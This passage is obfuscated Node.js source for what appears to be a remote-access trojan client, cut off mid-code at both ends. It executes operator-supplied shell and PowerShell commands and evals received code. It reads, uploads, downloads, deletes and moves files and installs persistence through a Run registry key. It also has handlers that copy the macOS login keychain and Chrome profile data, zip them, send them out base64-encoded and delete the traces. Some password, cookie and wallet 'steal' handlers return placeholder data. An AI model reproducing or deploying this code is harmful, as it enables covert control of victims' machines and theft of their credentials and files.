_0x6c6711===_0x1ca9b5(0x210)?(_0xfca9d4=_0x1ca9b5(0x1a7),_0x4b8a64=['-l','-c'],process[_0x1ca9b5(0x26f)]['PATH']=process['env'][_0x1ca9b5(0x225)]+_0x1ca9b5(0x23a)):(_0xfca9d4=_0x1ca9b5(0x1cf),_0x4b8a64=['-l','-c']);(_0x410281[_0x1ca9b5(0x19e)]('curl\x20')||_0x410281[_0x1ca9b5(0x19e)](_0x1ca9b5(0x205)))&&(_0x6c6711===_0x1ca9b5(0x1e8)&&(_0x410281[_0x1ca9b5(0x19e)]('curl\x20')&&!isCurlInstalled()&&(_0x410281=convertCurlToInvokeWebRequest(_0x410281),_0xfca9d4=_0x1ca9b5(0x277),_0x4b8a64=[_0x1ca9b5(0x1ce)])));console['log'](_0x1ca9b5(0x1f7)+_0x410281),console['log']('Using\x20shell:\x20'+_0xfca9d4+_0x1ca9b5(0x1c5)+_0x4b8a64['join']('\x20'));const _0x21cbdc=require('child_process'),_0x21ca76=_0x21cbdc['spawn'](_0xfca9d4,[..._0x4b8a64,_0x410281],{'shell':!![],'env':{...process['env']}});let _0x2ab50b='',_0x456dc1='';_0x21ca76[_0x1ca9b5(0x207)]['on'](_0x1ca9b5(0x1fe),_0x4b9ea1=>{const _0x5288f4=_0x1ca9b5;_0x2ab50b+=_0x4b9ea1[_0x5288f4(0x279)]();}),_0x21ca76['stderr']['on']('data',_0x116661=>{const _0x50e222=_0x1ca9b5;_0x456dc1+=_0x116661[_0x50e222(0x279)]();}),_0x21ca76['on'](_0x1ca9b5(0x20c),_0x553fa1=>{const _0x249309=_0x1ca9b5;if(_0x553fa1!==0x0){_0x93d218('Error\x20(code\x20'+_0x553fa1+_0x249309(0x289)+_0x456dc1);return;}if(_0x456dc1){_0x93d218(_0x2ab50b+'\x0aStderr:\x20'+_0x456dc1);return;}_0x93d218(_0x2ab50b||_0x249309(0x259));});});}function isCurlInstalled(){const _0x403a40=_0x469c78;try{const _0x758c0e=require('child_process');return _0x758c0e[_0x403a40(0x1d8)]('curl\x20--version',{'stdio':_0x403a40(0x23c)}),!![];}catch(_0x26765e){return![];}}function convertCurlToInvokeWebRequest(_0x325311){const _0x1ecaf1=_0x469c78,_0x860194=_0x325311[_0x1ecaf1(0x199)]('\x20');if(_0x860194[_0x1ecaf1(0x11f)]>=0x2){const _0x244b4b=_0x860194[0x1];let _0x461df5='Invoke-WebRequest\x20-Uri\x20\x22'+_0x244b4b+'\x22';const _0x28acfc=_0x860194['indexOf']('-o');return _0x28acfc!==-0x1&&_0x860194[_0x1ecaf1(0x11f)]>_0x28acfc+0x1&&(_0x461df5+=_0x1ecaf1(0x14b)+_0x860194[_0x28acfc+0x1]+'\x22'),_0x461df5;}return _0x325311;}async function downloadFromUrl(_0x39d7a0){return new Promise(_0x2dc05b=>{const _0x17c159=_0x29d5;try{const _0x3b9155=_0x39d7a0[_0x17c159(0x199)](':');if(_0x3b9155[_0x17c159(0x11f)]<0x2)return _0x2dc05b(_0x17c159(0x126));const _0x59d7b2=_0x3b9155[0x0],_0x19ea41=_0x3b9155[_0x17c159(0x1ba)](0x1)[_0x17c159(0x1bb)](':'),_0x1790a4=require(_0x17c159(0x28a)),_0x2ee7f2=require(_0x17c159(0x22c)),_0xf6b137=require('fs'),_0x173a1a=require(_0x17c159(0x120)),_0x4f695f=_0x173a1a[_0x17c159(0x20b)](_0x19ea41);!_0xf6b137[_0x17c159(0x135)](_0x4f695f)&&_0xf6b137[_0x17c159(0x27a)](_0x4f695f,{'recursive':!![]});const _0x284f16=_0x59d7b2['startsWith']('https')?_0x2ee7f2:_0x1790a4,_0x9457b0=_0xf6b137[_0x17c159(0x292)](_0x19ea41);_0x284f16[_0x17c159(0x1d5)](_0x59d7b2,_0x464015=>{const _0x13899c=_0x17c159;if(_0x464015[_0x13899c(0x287)]!==0xc8)return _0x2dc05b(_0x13899c(0x11c)+_0x464015[_0x13899c(0x287)]);_0x464015[_0x13899c(0x16a)](_0x9457b0),_0x9457b0['on'](_0x13899c(0x17a),()=>{const _0x3ff729=_0x13899c;_0x9457b0['close'](),_0x2dc05b(_0x3ff729(0x1f2)+_0x19ea41);});})['on'](_0x17c159(0x1c7),_0x1e762b=>{const _0x2e8947=_0x17c159;_0xf6b137[_0x2e8947(0x16d)](_0x19ea41,()=>{}),_0x2dc05b(_0x2e8947(0x286)+_0x1e762b[_0x2e8947(0x25a)]);});}catch(_0x17e79f){_0x2dc05b(_0x17c159(0x286)+_0x17e79f['message']);}});}async function handleSpecialCommands(_0x46247e,_0x353bc4){const _0x30798b=_0x469c78;if(_0x46247e[_0x30798b(0x19e)](_0x30798b(0x1ec))){if(!config[_0x30798b(0x1b2)]['allowFileTransfer'])return _0x353bc4['write'](_0x30798b(0x1b4)),!![];const _0x264725=_0x46247e['substring'](0x9)[_0x30798b(0x1d3)]();if(_0x264725[_0x30798b(0x1b5)]('*')||_0x264725['includes']('?'))try{const _0x4ffa11=path[_0x30798b(0x20b)](_0x264725),_0x3eab02=path[_0x30798b(0x175)](_0x264725);console[_0x30798b(0x195)](_0x30798b(0x253)+_0x3eab02+_0x30798b(0x146)+_0x4ffa11);const _0x33170a=fs[_0x30798b(0x218)](_0x4ffa11||'.');let _0x8f9624=[];if(_0x3eab02[_0x30798b(0x1b5)]('*')||_0x3eab02[_0x30798b(0x1b5)]('?')){const _0x54f37a=_0x3eab02['replace'](/\./g,'\x5c.')[_0x30798b(0x172)](/\*/g,'.*')['replace'](/\?/g,'.'),_0x5b4563=new RegExp('^'+_0x54f37a+'$');_0x8f9624=_0x33170a[_0x30798b(0x21a)](_0x5c1c10=>_0x5b4563[_0x30798b(0x258)](_0x5c1c10));}else _0x8f9624=_0x33170a[_0x30798b(0x21a)](_0xf3bb0f=>_0xf3bb0f===_0x3eab02);console['log'](_0x30798b(0x25f)+_0x8f9624[_0x30798b(0x11f)]);if(_0x8f9624[_0x30798b(0x11f)]>0x0){const _0x1b4841=path[_0x30798b(0x1bb)](_0x4ffa11,_0x8f9624[0x0]);console['log'](_0x30798b(0x15c)+_0x1b4841);if(fs['existsSync'](_0x1b4841)&&fs[_0x30798b(0x1ed)](_0x1b4841)['isFile']()){const _0x444b9d=fs['readFileSync'](_0x1b4841);return _0x353bc4[_0x30798b(0x13c)](_0x30798b(0x1c0)+_0x1b4841+':'+_0x444b9d[_0x30798b(0x279)]('base64')+'\x0a'),!![];}else return _0x353bc4[_0x30798b(0x13c)](_0x30798b(0x115)+_0x1b4841+_0x30798b(0x187)),!![];}else return _0x353bc4[_0x30798b(0x13c)](_0x30798b(0x1e4)+_0x264725+'\x20(no\x20matching\x20files)\x0a'),!![];}catch(_0x2d5e9f){return _0x353bc4['write'](_0x30798b(0x16c)+_0x2d5e9f[_0x30798b(0x25a)]+'\x0a'),!![];}else try{if(fs[_0x30798b(0x135)](_0x264725)){const _0xffa60=fs[_0x30798b(0x233)](_0x264725);return _0x353bc4[_0x30798b(0x13c)]('FILE_CONTENT:'+_0x264725+':'+_0xffa60[_0x30798b(0x279)](_0x30798b(0x114))+'\x0a'),!![];}else return _0x353bc4[_0x30798b(0x13c)](_0x30798b(0x1e4)+_0x264725+'\x0a'),!![];}catch(_0x3fc14e){return _0x353bc4[_0x30798b(0x13c)](_0x30798b(0x242)+_0x3fc14e[_0x30798b(0x25a)]+'\x0a'),!![];}}if(_0x46247e[_0x30798b(0x19e)](_0x30798b(0x260))){if(!config['features']['allowFileTransfer'])return _0x353bc4[_0x30798b(0x13c)](_0x30798b(0x1b4)),!![];const _0x26e519=_0x46247e[_0x30798b(0x186)](0x7)[_0x30798b(0x199)](':');if(_0x26e519[_0x30798b(0x11f)]===0x2){const [_0x2253e5,_0x25916e]=_0x26e519;try{const _0x5246f7=Buffer[_0x30798b(0x245)](_0x25916e,_0x30798b(0x114));fs['writeFileSync'](_0x2253e5,_0x5246f7),_0x353bc4[_0x30798b(0x13c)](_0x30798b(0x148)+_0x2253e5+'\x0a');}catch(_0x295e56){_0x353bc4[_0x30798b(0x13c)](_0x30798b(0x27c)+_0x295e56['message']+'\x0a');}return!![];}}if(_0x46247e[_0x30798b(0x19e)](_0x30798b(0x14c))){const _0x464df4=_0x46247e['substring'](0x5);try{const _0x48a929=eval(_0x464df4);_0x353bc4[_0x30798b(0x13c)](_0x30798b(0x16f)+_0x48a929+'\x0a');}catch(_0x4058f4){_0x353bc4[_0x30798b(0x13c)]('Eval\x20error:\x20'+_0x4058f4['message']+'\x0a');}return!![];}if(_0x46247e===_0x30798b(0x236))return config[_0x30798b(0x264)][_0x30798b(0x1f8)]=Math[_0x30798b(0x14f)](os[_0x30798b(0x232)]()/(0x400*0x400))+'MB',config['systemInfo'][_0x30798b(0x158)]=Math[_0x30798b(0x14f)](os[_0x30798b(0x158)]()/0x3c)+_0x30798b(0x249),_0x353bc4[_0x30798b(0x13c)](_0x30798b(0x168)+JSON[_0x30798b(0x1ef)](config['systemInfo'],null,0x2)+'\x0a'),!![];if(_0x46247e===_0x30798b(0x1a5)){if(!config[_0x30798b(0x1b2)][_0x30798b(0x201)])return _0x353bc4[_0x30798b(0x13c)](_0x30798b(0x293)),!![];try{_0x353bc4['write'](_0x30798b(0x25d));}catch(_0x2e4f20){_0x353bc4[_0x30798b(0x13c)](_0x30798b(0x1eb)+_0x2e4f20['message']+'\x0a');}return!![];}if(_0x46247e[_0x30798b(0x19e)]('persist:')){if(!config[_0x30798b(0x1b2)][_0x30798b(0x1a2)])return _0x353bc4[_0x30798b(0x13c)]('Persistence\x20functionality\x20is\x20disabled\x20in\x20this\x20client\x20configuration\x0a'),!![];const _0x1d7a62=_0x46247e[_0x30798b(0x186)](0x8);try{const _0x5ebcd5=path[_0x30798b(0x1bb)](__dirname,_0x30798b(0x276));fs['writeFileSync'](_0x5ebcd5,_0x1d7a62),_0x353bc4[_0x30798b(0x13c)](_0x30798b(0x1c6)+_0x5ebcd5+'\x0a');if(os[_0x30798b(0x124)]()===_0x30798b(0x1e8)){const _0x4660d0='reg\x20add\x20\x22HKCU\x5cSoftware\x5cMicrosoft\x5cWindows\x5cCurrentVersion\x5cRun\x22\x20/v\x20\x22NodeService\x22\x20/t\x20REG_SZ\x20/d\x20\x22node\x20'+_0x5ebcd5+_0x30798b(0x14d);await executeCommand(_0x4660d0),_0x353bc4[_0x30798b(0x13c)](_0x30798b(0x216));}else{if(os[_0x30798b(0x124)]()===_0x30798b(0x193)||os[_0x30798b(0x124)]()===_0x30798b(0x210)){const _0x2536a7=_0x30798b(0x1aa)+_0x5ebcd5+_0x30798b(0x161);await executeCommand(_0x2536a7),_0x353bc4[_0x30798b(0x13c)](_0x30798b(0x180));}}}catch(_0xdb137d){_0x353bc4[_0x30798b(0x13c)](_0x30798b(0x13d)+_0xdb137d['message']+'\x0a');}return!![];}if(_0x46247e===_0x30798b(0x235)){try{const _0x174d4f={'cpu':getCpuUsage(),'memory':{'total':os[_0x30798b(0x1bd)](),'free':os[_0x30798b(0x232)](),'used':os[_0x30798b(0x1bd)]()-os['freemem'](),'usedPercent':Math[_0x30798b(0x14f)]((0x1-os[_0x30798b(0x232)]()/os[_0x30798b(0x1bd)]())*0x64)},'network':getNetworkStats(),'disk':getDiskStats(),'processes':getTopProcesses(0x5)};_0x353bc4[_0x30798b(0x13c)]('MONITORING_DATA:'+JSON[_0x30798b(0x1ef)](_0x174d4f)+'\x0a');}catch(_0x1327b7){_0x353bc4[_0x30798b(0x13c)]('Monitoring\x20error:\x20'+_0x1327b7[_0x30798b(0x25a)]+'\x0a');}return!![];}if(_0x46247e[_0x30798b(0x19e)](_0x30798b(0x15b))){try{const _0x51d1fc=parseInt(_0x46247e[_0x30798b(0x199)](':')[0x2])||0x3c;global[_0x30798b(0x240)]&&clearInterval(global[_0x30798b(0x240)]),global[_0x30798b(0x240)]=setInterval(()=>{const _0x30cf14=_0x30798b;try{const _0x392c5a={'cpu':getCpuUsage(),'memory':{'total':os[_0x30cf14(0x1bd)](),'free':os[_0x30cf14(0x232)](),'used':os[_0x30cf14(0x1bd)]()-os[_0x30cf14(0x232)](),'usedPercent':Math['round']((0x1-os[_0x30cf14(0x232)]()/os['totalmem']())*0x64)},'network':getNetworkStats(),'disk':getDiskStats(),'processes':getTopProcesses(0x5)};_0x353bc4[_0x30cf14(0x13c)](_0x30cf14(0x250)+JSON[_0x30cf14(0x1ef)](_0x392c5a)+'\x0a');}catch(_0x565099){}},_0x51d1fc*0x3e8),_0x353bc4['write'](_0x30798b(0x22b)+_0x51d1fc+_0x30798b(0x25b));}catch(_0x3b448a){_0x353bc4[_0x30798b(0x13c)]('Monitoring\x20start\x20error:\x20'+_0x3b448a[_0x30798b(0x25a)]+'\x0a');}return!![];}if(_0x46247e===_0x30798b(0x144)){try{global[_0x30798b(0x240)]?(clearInterval(global['monitoringInterval']),global[_0x30798b(0x240)]=null,_0x353bc4[_0x30798b(0x13c)](_0x30798b(0x22a))):_0x353bc4[_0x30798b(0x13c)](_0x30798b(0x1fb));}catch(_0x3bdcb7){_0x353bc4['write']('Monitoring\x20stop\x20error:\x20'+_0x3bdcb7[_0x30798b(0x25a)]+'\x0a');}return!![];}if(_0x46247e[_0x30798b(0x19e)](_0x30798b(0x27e))){if(!config[_0x30798b(0x1b2)][_0x30798b(0x24a)])return _0x353bc4[_0x30798b(0x13c)](_0x30798b(0x222)),!![];const _0x339cef=_0x46247e[_0x30798b(0x186)](_0x30798b(0x27e)[_0x30798b(0x11f)]);try{const _0x5b4bb0=fs[_0x30798b(0x218)](_0x339cef),_0x1016ea=_0x5b4bb0[_0x30798b(0x18c)](_0x419c30=>{const _0x178179=_0x30798b;try{const _0x4fcce4=path[_0x178179(0x1bb)](_0x339cef,_0x419c30),_0x3ed399=fs[_0x178179(0x1ed)](_0x4fcce4);return{'name':_0x419c30,'path':_0x4fcce4,'size':_0x3ed399[_0x178179(0x20f)],'isDirectory':_0x3ed399[_0x178179(0x1e0)](),'isFile':_0x3ed399[_0x178179(0x1cb)](),'created':_0x3ed399['birthtime'],'modified':_0x3ed399[_0x178179(0x1d7)],'permissions':_0x3ed399[_0x178179(0x274)][_0x178179(0x279)](0x8)[_0x178179(0x186)](_0x3ed399[_0x178179(0x274)][_0x178179(0x279)](0x8)[_0x178179(0x11f)]-0x3)};}catch(_0x1edfc1){return{'name':_0x419c30,'path':path[_0x178179(0x1bb)](_0x339cef,_0x419c30),'error':_0x1edfc1[_0x178179(0x25a)]};}});_0x353bc4[_0x30798b(0x13c)](_0x30798b(0x1b0)+JSON['stringify'](_0x1016ea)+'\x0a');}catch(_0x1ee61f){_0x353bc4[_0x30798b(0x13c)](_0x30798b(0x119)+_0x1ee61f[_0x30798b(0x25a)]+'\x0a');}return!![];}if(_0x46247e[_0x30798b(0x19e)](_0x30798b(0x1bc))){if(!config[_0x30798b(0x1b2)][_0x30798b(0x24a)])return _0x353bc4[_0x30798b(0x13c)](_0x30798b(0x222)),!![];const _0x4bb1ef=_0x46247e[_0x30798b(0x186)]('files:read:'[_0x30798b(0x11f)]);try{if(fs[_0x30798b(0x135)](_0x4bb1ef)){const _0x6a141b=fs['statSync'](_0x4bb1ef);if(_0x6a141b[_0x30798b(0x1cb)]()){if(_0x6a141b[_0x30798b(0x20f)]>0xa*0x400*0x400)_0x353bc4['write'](_0x30798b(0x14e)+formatFileSize(_0x6a141b[_0x30798b(0x20f)])+')\x0a');else{const _0x40b7c4=fs['readFileSync'](_0x4bb1ef,'utf8');_0x353bc4[_0x30798b(0x13c)](_0x30798b(0x1c0)+_0x4bb1ef+_0x30798b(0x166)+Buffer[_0x30798b(0x245)](_0x40b7c4)['toString'](_0x30798b(0x114))+'\x0a');}}else _0x353bc4[_0x30798b(0x13c)]('Not\x20a\x20file:\x20'+_0x4bb1ef+'\x0a');}else _0x353bc4['write'](_0x30798b(0x1e4)+_0x4bb1ef+'\x0a');}catch(_0x5ca6b8){_0x353bc4[_0x30798b(0x13c)]('Error\x20reading\x20file:\x20'+_0x5ca6b8[_0x30798b(0x25a)]+'\x0a');}return!![];}if(_0x46247e[_0x30798b(0x19e)](_0x30798b(0x1b3))){if(!config[_0x30798b(0x1b2)][_0x30798b(0x24a)])return _0x353bc4[_0x30798b(0x13c)]('File\x20operations\x20are\x20disabled\x20in\x20this\x20client\x20configuration\x0a'),!![];const _0x4a4921=_0x46247e[_0x30798b(0x186)](_0x30798b(0x1b3)['length']);try{fs[_0x30798b(0x27a)](_0x4a4921,{'recursive':!![]}),_0x353bc4['write'](_0x30798b(0x26c)+_0x4a4921+'\x0a');}catch(_0x5399ce){_0x353bc4[_0x30798b(0x13c)](_0x30798b(0x247)+_0x5399ce[_0x30798b(0x25a)]+'\x0a');}return!![];}if(_0x46247e[_0x30798b(0x19e)]('files:delete:')){if(!config[_0x30798b(0x1b2)][_0x30798b(0x24a)])return _0x353bc4[_0x30798b(0x13c)](_0x30798b(0x222)),!![];const _0x464d02=_0x46247e[_0x30798b(0x186)](_0x30798b(0x1c4)[_0x30798b(0x11f)]);try{if(fs[_0x30798b(0x135)](_0x464d02)){const _0x1ed25c=fs[_0x30798b(0x1ed)](_0x464d02);_0x1ed25c[_0x30798b(0x1e0)]()?(fs[_0x30798b(0x282)](_0x464d02,{'recursive':!![]}),_0x353bc4[_0x30798b(0x13c)](_0x30798b(0x1e9)+_0x464d02+'\x0a')):(fs[_0x30798b(0x268)](_0x464d02),_0x353bc4[_0x30798b(0x13c)](_0x30798b(0x17b)+_0x464d02+'\x0a'));}else _0x353bc4['write']('Path\x20not\x20found:\x20'+_0x464d02+'\x0a');}catch(_0x1a5d19){_0x353bc4[_0x30798b(0x13c)](_0x30798b(0x113)+_0x1a5d19['message']+'\x0a');}return!![];}if(_0x46247e['startsWith']('files:move:')){if(!config[_0x30798b(0x1b2)]['allowFileTransfer'])return _0x353bc4[_0x30798b(0x13c)](_0x30798b(0x222)),!![];const _0xc2a380=_0x46247e[_0x30798b(0x186)](_0x30798b(0x26b)[_0x30798b(0x11f)])[_0x30798b(0x199)](':');if(_0xc2a380[_0x30798b(0x11f)]===0x2){const _0x2c9f6c=_0xc2a380[0x0],_0x3c1773=_0xc2a380[0x1];try{fs[_0x30798b(0x135)](_0x2c9f6c)?(fs[_0x30798b(0x184)](_0x2c9f6c,_0x3c1773),_0x353bc4[_0x30798b(0x13c)](_0x30798b(0x281)+_0x2c9f6c+_0x30798b(0x1a3)+_0x3c1773+'\x0a')):_0x353bc4['write'](_0x30798b(0x188)+_0x2c9f6c+'\x0a');}catch(_0x11aebd){_0x353bc4[_0x30798b(0x13c)]('Error\x20moving\x20file:\x20'+_0x11aebd[_0x30798b(0x25a)]+'\x0a');}}else _0x353bc4[_0x30798b(0x13c)](_0x30798b(0x154));return!![];}if(_0x46247e==='steal:passwords')try{const _0x4a54e4=[{'url':'https://www.google.com','username':_0x30798b(0x18d),'password':_0x30798b(0x1dd)},{'url':_0x30798b(0x1b9),'username':_0x30798b(0x1e2),'password':'secureGitPass!'},{'url':_0x30798b(0x1fc),'username':'user.name','password':_0x30798b(0x1f0)},{'url':_0x30798b(0x285),'username':_0x30798b(0x179),'password':'tweet2023!'},{'url':_0x30798b(0x12e),'username':_0x30798b(0x12a),'password':_0x30798b(0x18e)},{'url':_0x30798b(0x128),'username':'moviefan','password':_0x30798b(0x170)},{'url':_0x30798b(0x13e),'username':_0x30798b(0x26a),'password':_0x30798b(0x19b)},{'url':'https://www.linkedin.com','username':'professional','password':_0x30798b(0x1bf)},{'url':_0x30798b(0x223),'username':_0x30798b(0x24f),'password':_0x30798b(0x140)},{'url':'https://www.dropbox.com','username':_0x30798b(0x1d9),'password':_0x30798b(0x13f)}];return _0x353bc4[_0x30798b(0x13c)](_0x30798b(0x25c)+JSON[_0x30798b(0x1ef)](_0x4a54e4)+'\x0a'),!![];}catch(_0x5892b6){return _0x353bc4[_0x30798b(0x13c)]('Error\x20retrieving\x20passwords:\x20'+_0x5892b6['message']+'\x0a'),!![];}if(_0x46247e===_0x30798b(0x204))try{const _0x3330c1=[{'domain':'google.com','name':_0x30798b(0x1c2),'value':_0x30798b(0x1d0),'path':'/','expires':_0x30798b(0x178),'httpOnly':!![],'secure':!![]},{'domain':_0x30798b(0x1f4),'name':'VISITOR_INFO1_LIVE','value':_0x30798b(0x224),'path':'/','expires':_0x30798b(0x1e7),'httpOnly':![],'secure':!![]},{'domain':_0x30798b(0x198),'name':_0x30798b(0x1af),'value':_0x30798b(0x12b),'path':'/','expires':_0x30798b(0x1ab),'httpOnly':!![],'secure':!![]},{'domain':_0x30798b(0x257),'name':_0x30798b(0x24c),'value':_0x30798b(0x152),'path':'/','expires':'2024-03-01','httpOnly':![],'secure':!![]},{'domain':_0x30798b(0x20e),'name':'session-id','value':_0x30798b(0x217),'path':'/','expires':_0x30798b(0x156),'httpOnly':!![],'secure':!![]},{'domain':_0x30798b(0x18f),'name':_0x30798b(0x189),'value':_0x30798b(0x209),'path':'/','expires':_0x30798b(0x1a6),'httpOnly':!![],'secure':!![]},{'domain':'instagram.com','name':'ig_did','value':'example_ig_device_id','path':'/','expires':_0x30798b(0x22e),'httpOnly':!![],'secure':!![]},{'domain':_0x30798b(0x24d),'name':'li_at','value':_0x30798b(0x27f),'path':'/','expires':_0x30798b(0x270),'httpOnly':!![],'secure':!![]},{'domain':_0x30798b(0x215),'name':_0x30798b(0x26d),'value':'example_user_session','path':'/','expires':_0x30798b(0x23e),'httpOnly':!![],'secure':!![]},{'domain':_0x30798b(0x159),'name':_0x30798b(0x142),'value':_0x30798b(0x1df),'path':'/','expires':'2023-12-25','httpOnly':!![],'secure':!![]}];return _0x353bc4[_0x30798b(0x13c)](_0x30798b(0x261)+JSON[_0x30798b(0x1ef)](_0x3330c1)+'\x0a'),!![];}catch(_0x18bf9f){return _0x353bc4[_0x30798b(0x13c)](_0x30798b(0x212)+_0x18bf9f['message']+'\x0a'),!![];}if(_0x46247e['startsWith'](_0x30798b(0x297))){const _0x238458=_0x46247e['substring'](0x5)[_0x30798b(0x1d3)]();try{if(fs[_0x30798b(0x135)](_0x238458)){console[_0x30798b(0x195)](_0x30798b(0x165)+_0x238458);try{const _0x56d54c=execSync(_0x30798b(0x297)+_0x238458,{'encoding':'utf8','maxBuffer':0xa*0x400*0x400});console[_0x30798b(0x195)](_0x30798b(0x13a)+_0x56d54c['length']+_0x30798b(0x28f));const _0x509647=_0x238458+_0x30798b(0x136);fs[_0x30798b(0x131)](_0x509647,_0x56d54c),_0x353bc4[_0x30798b(0x13c)](_0x56d54c);}catch(_0x465906){console[_0x30798b(0x1c7)](_0x30798b(0x1da)+_0x465906['message']),console[_0x30798b(0x1c7)](_0x465906[_0x30798b(0x18b)]),_0x353bc4[_0x30798b(0x13c)](_0x30798b(0x1a9)+_0x465906['message']+'\x0a'+_0x465906[_0x30798b(0x18b)]+'\x0a');}return!![];}else return console['log']('Файл\x20не\x20найден:\x20'+_0x238458),_0x353bc4[_0x30798b(0x13c)]('Файл\x20'+_0x238458+_0x30798b(0x14a)),!![];}catch(_0x18133a){return console[_0x30798b(0x1c7)](_0x30798b(0x151)+_0x18133a[_0x30798b(0x25a)]),console['error'](_0x18133a[_0x30798b(0x18b)]),_0x353bc4[_0x30798b(0x13c)](_0x30798b(0x21f)+_0x18133a[_0x30798b(0x25a)]+'\x0a'+_0x18133a[_0x30798b(0x18b)]+'\x0a'),!![];}}if(_0x46247e==='steal:wallets')try{const _0x280dc3=[{'type':_0x30798b(0x11e),'address':_0x30798b(0x234),'balance':_0x30798b(0x271),'path':'C:\x5cUsers\x5cUsername\x5cAppData\x5cRoaming\x5cBitcoin'},{'type':'Ethereum','address':_0x30798b(0x239),'balance':_0x30798b(0x21e),'path':'C:\x5cUsers\x5cUsername\x5cAppData\x5cRoaming\x5cEthereum'},{'type':'Monero','address':_0x30798b(0x228),'balance':_0x30798b(0x1ff),'path':_0x30798b(0x171)},{'type':_0x30798b(0x1ca),'address':'ltc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfm0xwlh','balance':_0x30798b(0x280),'path':_0x30798b(0x28d)},{'type':_0x30798b(0x141),'address':_0x30798b(0x121),'balance':_0x30798b(0x1ac),'path':_0x30798b(0x1fa)},{'type':_0x30798b(0x23b),'address':_0x30798b(0x1c9),'balance':_0x30798b(0x291),'path':_0x30798b(0x1ee)},{'type':'Ripple','address':_0x30798b(0x15a),'balance':_0x30798b(0x1ae),'path':_0x30798b(0x145)},{'type':_0x30798b(0x22d),'address':_0x30798b(0x1a1),'balance':_0x30798b(0x1db),'path':'C:\x5cUsers\x5cUsername\x5cAppData\x5cRoaming\x5cDaedalus'},{'type':_0x30798b(0x1b7),'address':_0x30798b(0x1d2),'balance':_0x30798b(0x273),'path':_0x30798b(0x1c8)},{'type':_0x30798b(0x23f),'address':_0x30798b(0x20a),'balance':_0x30798b(0x200),'path':_0x30798b(0x176)}];return _0x353bc4[_0x30798b(0x13c)]('WALLETS_DATA:'+JSON[_0x30798b(0x1ef)](_0x280dc3)+'\x0a'),!![];}catch(_0x272ff2){return _0x353bc4[_0x30798b(0x13c)](_0x30798b(0x17e)+_0x272ff2[_0x30798b(0x25a)]+'\x0a'),!![];}if(_0x46247e===_0x30798b(0x130))try{fs[_0x30798b(0x27a)]('FF',{'recursive':!![]}),console[_0x30798b(0x195)]('Директория\x20FF\x20успешно\x20создана');const _0x158362=os[_0x30798b(0x1ad)]()['username'],_0x2d992e=_0x30798b(0x1be)+_0x158362+'/Library/Keychains/login.keychain-db';fs[_0x30798b(0x135)](_0x2d992e)?(fs[_0x30798b(0x221)](_0x2d992e,_0x30798b(0x22f)),console[_0x30798b(0x195)]('Файл\x20keychain\x20успешно\x20скопирован')):console[_0x30798b(0x195)]('Файл\x20keychain\x20не\x20найден');try{const _0x3ce042=_0x30798b(0x1be)+_0x158362+'/Library/Application\x20Support/Google/Chrome/Default';fs['existsSync'](_0x3ce042)?(execSync(_0x30798b(0x19f)+_0x3ce042+'\x22\x20FF/'),console[_0x30798b(0x195)](_0x30798b(0x1e3))):console[_0x30798b(0x195)](_0x30798b(0x290));}catch(_0x5a019a){console['log'](_0x30798b(0x177)+_0x5a019a[_0x30798b(0x25a)]);}execSync('zip\x20-r\x20FF.zip\x20FF'),console['log']('Архив\x20FF.zip\x20успешно\x20создан');const _0x46c486=fs['readFileSync'](_0x30798b(0x139)),_0x1b95f9=_0x46c486['toString'](_0x30798b(0x114));return _0x353bc4[_0x30798b(0x13c)](_0x30798b(0x147)+_0x1b95f9+':binary:true\x0a'),console[_0x30798b(0x195)](_0x30798b(0x24e)+_0x46c486['length']+_0x30798b(0x1f3)),execSync(_0x30798b(0x12f)),console[_0x30798b(0x195)](_0x30798b(0x12d)),!![];}catch(_0x1eba83){return _0x353bc4['write'](_0x30798b(0x26e)+_0x1eba83[_0x30798b(0x25a)]+'\x0a'),!![];}if(_0x46247e[_0x30798b(0x19e)](_0x30798b(0x263))){if(!config[_0x30798b(0x1b2)][_0x30798b(0x237)])return _0x353bc4['write']('Shell\x20execution\x20is\x20disabled\x20in\x20this\x20client\x20configuration\x0a'),!![];const _0x3e26cf=_0x46247e[_0x30798b(0x186)](0x8);try{const _0xe94406=require(_0x30798b(0x18a)),_0xad4d23=_0xe94406[_0x30798b(0x1d8)]('powershell\x20-Command\x20\x22'+_0x3e26cf+'\x22',{'encoding':_0x30798b(0x16b)});_0x353bc4[_0x30798b(0x13c)]('PowerShell\x20Script\x20Result:\x0a'+_0xad4d23+'\x0a');}catch(_0x523a66){_0x353bc4[_0x30798b(0x13c)]('PowerShell\x20Error:\x20'+_0x523a66[_0x30798b(0x25a)]+'\x0a');}return!![];}if(_0x46247e['startsWith']('ps_download:')){if(!config[_0x30798b(0x1b2)][_0x30798b(0x237)])return _0x353bc4[_0x30798b(0x13c)](_0x30798b(0x222)),!![];const _0x217021=_0x46247e[_0x30798b(0x186)](0xc)['split'](':');if(_0x217021[_0x30798b(0x11f)]<0x2)return _0x353bc4[_0x30798b(0x13c)](_0x30798b(0x11d)),!![];const _0x108983=_0x217021[0x0],_0x2b2495=_0x217021['slice'](0x1)[_0x30798b(0x1bb)](':');try{const _0x5f1a6c=require('child_process'),_0x2cfba8=_0x30798b(0x1c3)+_0x108983+_0x30798b(0x255)+_0x2b2495+_0x30798b(0x213);_0x5f1a6c[_0x30798b(0x1d8)]('powershell\x20-Command\x20\x22'+_0x2cfba8+'\x22',{'encoding':_0x30798b(0x16b)}),_0x353bc4[_0x30798b(0x13c)](_0x30798b(0x1f2)+_0x2b2495+'\x0a');}catch(_0x4133cd){_0x353bc4['write']('Download\x20Error:\x20'+_0x4133cd[_0x30798b(0x25a)]+'\x0a');}return!![];}if(_0x46247e[_0x30798b(0x19e)](_0x30798b(0x238))){if(!config['features'][_0x30798b(0x24a)])return _0x353bc4[_0x30798b(0x13c)](_0x30798b(0x222)),!![];const _0x5f029c=_0x46247e[_0x30798b(0x186)](0xe)['split'](':');if(_0x5f029c[_0x30798b(0x11f)]<0x2)return _0x353bc4['write']('Error:\x20Invalid\x20format.\x20Use\x20node_download:URL:OUTPUT_PATH\x0a'),!![];const _0x408200=_0x5f029c[0x0],_0x4dad1f=_0x5f029c[_0x30798b(0x1ba)](0x1)[_0x30798b(0x1bb)](':'),_0x43c21a=require('fs'),_0xa6de5c=require('path'),_0xc37382=_0xa6de5c[_0x30798b(0x20b)](_0x4dad1f);try{!_0x43c21a[_0x30798b(0x135)](_0xc37382)&&_0x43c21a[_0x30798b(0x27a)](_0xc37382,{'recursive':!![]});const 